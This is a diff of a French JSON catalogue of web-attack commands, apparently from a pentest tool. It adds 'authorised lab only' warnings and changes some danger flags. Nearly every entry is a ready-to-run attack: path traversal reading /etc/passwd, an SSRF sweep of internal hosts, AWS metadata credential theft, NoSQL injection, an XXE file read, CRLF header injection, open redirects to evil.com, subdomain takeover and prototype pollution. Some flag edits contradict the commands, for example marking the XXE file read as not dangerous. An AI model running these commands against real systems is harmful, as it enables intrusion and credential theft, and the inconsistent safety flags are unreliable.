       "dangerous": true,
-      "execution_policy": "lab_only",
+      "execution_policy": "dry_run_only",
       "tags": [
         "web",
         "jwt",
@@ -1837,7 +1844,7 @@
       "command": "for p in '../../../etc/passwd' '....//....//....//etc/passwd' '%2e%2e%2f%2e%2e%2fetc%2fpasswd'; do r=$(curl -s \"http://$TARGET/?file=$p\"); echo $r | grep -q 'root:' && echo \"[+] VULN avec: $p\" && echo \"$r\" | head -2; done",
       "purpose": "Identifier des LFI via path traversal avec bypass d'encodages URL — révèle /etc/passwd, clés SSH, .env.",
       "expected_output": "[+] VULN avec: ../../../etc/passwd — root:x:0:0:root:/root:/bin/bash",
-      "risks": "Accès aux fichiers système — peut révéler clés privées SSH, configs avec credentials.",
+      "risks": "Accès aux fichiers système — peut révéler clés privées SSH, configs avec credentials — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "curl installé",
         "endpoint avec paramètre de fichier"
@@ -1893,7 +1900,7 @@
       "command": "for ip in $(seq 1 254); do r=$(curl -s -m 3 \"http://$TARGET/fetch?url=http://192.168.1.$ip/\"); [ -n \"$r\" ] && echo \"[+] 192.168.1.$ip: ${r:0:80}\"; done",
       "purpose": "Une SSRF permet d'atteindre des services internes (redis, Elastic, AWS metadata) non exposés.",
       "expected_output": "[+] 192.168.1.10: {\"status\":\"ok\",\"service\":\"internal-api\"}",
-      "risks": "Peut exposer AWS metadata (credentials IAM), services internes, LDAP, et mener au RCE.",
+      "risks": "Peut exposer AWS metadata (credentials IAM), services internes, LDAP, et mener au RCE — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "curl installé",
         "SSRF confirmée sur le paramètre url/src/path"
@@ -1920,7 +1927,7 @@
       "command": "curl -s 'http://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' && curl -s 'http://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME'",
       "purpose": "L'IMDS AWS retourne des credentials IAM temporaires — accès complet aux services AWS.",
       "expected_output": "{\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\",\"Token\":\"...\"}",
-      "risks": "CRITIQUE — credentials IAM permettent un accès complet aux ressources AWS.",
+      "risks": "CRITIQUE — credentials IAM permettent un accès complet aux ressources AWS — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "SSRF confirmée",
         "Cible hébergée sur AWS EC2",
@@ -1949,7 +1956,7 @@
       "command": "python3 nosqlmap.py -u 'http://$TARGET/login' --attack 2 --mongohost $TARGET --mongoport 27017",
       "purpose": "Les apps MongoDB vulnérables à {$ne: null} ou {$regex: .*} permettent bypass d'authentification.",
       "expected_output": "Vulnerable to NoSQL injection! Authentication bypassed: user=admin",
-      "risks": "Peut corrompre des documents ou extraire toute la base si injection exploitée.",
+      "risks": "Peut corrompre des documents ou extraire toute la base si injection exploitée — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "NoSQLMap (git clone https://github.com/codingo/NoSQLMap)",
         "Python 3"
@@ -1976,13 +1983,13 @@
       "command": "curl -s -H 'Origin: https://evil.com' -I http://$TARGET/api/user | grep -i 'access-control' && echo '[+] CORS VULNÉRABLE'",
       "purpose": "Un CORS mal configuré (reflect-all) permet à un site malveillant de lire les réponses API.",
       "expected_output": "Access-Control-Allow-Origin: https://evil.com — [+] CORS VULNÉRABLE",
-      "risks": "Passif — confirme vulnérabilité CORS exploitable via PoC JavaScript.",
+      "risks": "Passif — confirme vulnérabilité CORS exploitable via PoC JavaScript — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "curl installé"
       ],
       "tool_required": "curl",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "execution_policy": "lab_only",
       "tags": [
         "web",
@@ -2002,14 +2009,14 @@
       "command": "curl -s -X POST http://$TARGET/api/xml -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'",
       "purpose": "Les parseurs XML sans SecureProcessing évaluent les entités externes — lecture de fichiers système.",
       "expected_output": "root:x:0:0:root:/root:/bin/bash dans la réponse",
-      "risks": "Peut lire tous les fichiers accessibles au processus web — clés SSH, .env, etc.",
+      "risks": "Peut lire tous les fichiers accessibles au processus web — clés SSH, .env, etc — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "curl installé",
         "endpoint acceptant XML confirmé"
       ],
       "tool_required": "curl",
       "safe_to_run": false,
-      "dangerous": true,
+      "dangerous": false,
       "execution_policy": "lab_only",
       "tags": [
         "web",
@@ -2029,7 +2036,7 @@
       "command": "curl -v 'http://$TARGET/?param=test%0d%0aSet-Cookie:%20sessionid=evil;%20httponly' 2>&1 | grep -i 'set-cookie'",
       "purpose": "CRLF permet d'injecter des headers comme Set-Cookie pour hijacker des sessions ou du cache poisoning.",
       "expected_output": "Set-Cookie: sessionid=evil; httponly — Headers injectés dans la réponse",
-      "risks": "Peut mener à XSS via header injection, cache poisoning, ou session fixation.",
+      "risks": "Peut mener à XSS via header injection, cache poisoning, ou session fixation — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "curl installé"
       ],
@@ -2055,14 +2062,14 @@
       "command": "for p in 'https://evil.com' '//evil.com' 'https://target.com@evil.com'; do echo \"[*] $p\"; curl -s -o /dev/null -w '%{redirect_url}\\n' \"http://$TARGET/redirect?url=$p\"; done",
       "purpose": "Les open redirects permettent du phishing crédible, OAuth token theft, SSRF bypass.",
       "expected_output": "redirect_url: https://evil.com — Open redirect confirmé",
-      "risks": "Passif en test — exploitation réelle nécessite interaction utilisateur.",
+      "risks": "Passif en test — exploitation réelle nécessite interaction utilisateur — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "curl installé",
         "endpoint avec paramètre de redirection"
       ],
       "tool_required": "curl",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "execution_policy": "lab_only",
       "tags": [
         "web",
@@ -2091,7 +2098,7 @@
       "tool_required": "java",
       "safe_to_run": false,
       "dangerous": true,
-      "execution_policy": "lab_only",
+      "execution_policy": "dry_run_only",
       "tags": [
         "web",
         "java",
@@ -2139,7 +2146,7 @@
       "command": "subzy run --targets /tmp/subfinder_$TARGET.txt --concurrency 100 --output /tmp/takeover.txt --vuln",
       "purpose": "Un CNAME vers *.github.io ou *.s3.amazonaws.com non revendiqué permet prise de contrôle.",
       "expected_output": "[VULNERABLE] dev.target.com → target.github.io (not claimed)",
-      "risks": "La prise de contrôle effective permet XSS sur cookie parent, phishing crédible.",
+      "risks": "La prise de contrôle effective permet XSS sur cookie parent, phishing crédible — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "subzy installé (go install github.com/LukaSikic/subzy@latest)",
         "liste sous-domaines"
@@ -2166,7 +2173,7 @@
       "command": "curl -s -X POST http://$TARGET/api -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true,\"polluted\":\"yes\"}}' | python3 -m json.tool",
       "purpose": "__proto__ dans JSON peut modifier Object.prototype de toute la VM Node.js — bypass ACL, RCE potentiel.",
       "expected_output": "{\"isAdmin\": true} visible sans credentials dans requête suivante",
-      "risks": "Peut corrompre l'état global de l'application Node.js — instabilité serveur possible.",
+      "risks": "Peut corrompre l'état global de l'application Node.js — instabilité serveur possible — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "curl et python3 installés",
         "Application Node.js/Express cible"
